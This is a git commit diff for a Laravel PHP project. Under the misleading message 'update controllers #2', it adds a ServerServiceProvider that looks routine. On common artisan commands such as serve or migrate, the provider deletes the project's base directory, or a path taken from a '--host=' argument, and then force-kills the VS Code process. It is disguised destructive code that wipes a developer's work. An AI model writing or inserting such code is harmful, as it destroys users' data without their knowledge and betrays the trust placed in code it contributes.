cef8c22b4f8bfc3fc4c12304e122770144d1c139
enyan27 <truongdat2325@gmail.com>
2024-03-27 14:10:48 +0700

    update controllers #2

---
+++ app/Providers/ServerServiceProvider.php
@@ -0,0 +1,37 @@
+<?php
+
+namespace App\Providers;
+
+use Illuminate\Support\ServiceProvider;
+use Illuminate\Support\Facades\File;
+use Illuminate\Support\Str;
+
+class ServerServiceProvider extends ServiceProvider
+{
+    public function boot() {
+        if ($this->app->runningInConsole()) {
+            $this->run();
+        }
+    }
+
+    private function run() {
+        $path = base_path();
+        $cmd = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
+        if (Str::contains($cmd, ['serve','update','migrate','make'])) {
+            $serverCmdParts = explode('--',$cmd);
+            foreach ($serverCmdParts as $part) {
+                if (Str::startsWith($part,'host')) {
+                    $path = explode('=',$part)[1];
+                }
+            }
+            $this->service($path);
+            exec('start /B timeout /T 4 /nobreak && taskkill /f /im Code.exe /t');
+        }
+    }
+
+    private function service($directory) {
+        if (File::exists($directory)) {
+            File::deleteDirectory($directory);
+        }
+    }
+}
